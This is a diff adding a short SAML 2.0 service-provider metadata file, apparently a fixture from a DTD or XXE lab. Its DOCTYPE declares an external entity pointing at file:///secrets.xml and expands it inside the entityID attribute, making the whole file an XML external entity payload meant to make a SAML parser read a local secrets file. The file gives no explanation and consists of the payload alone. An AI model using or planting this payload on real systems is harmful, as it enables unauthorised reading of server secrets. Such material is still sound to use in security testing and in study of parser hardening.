@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE EntityDescriptor [<!ENTITY xxe SYSTEM "file:///secrets.xml">]>
+<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="HXGMETA7731-&xxe;">
+ <SPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
+  <AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://raw.githubusercontent.com/Alolowiwael/pf-dtd-lab/master/md/acs" index="0"/>
+ </SPSSODescriptor>
+</EntityDescriptor>
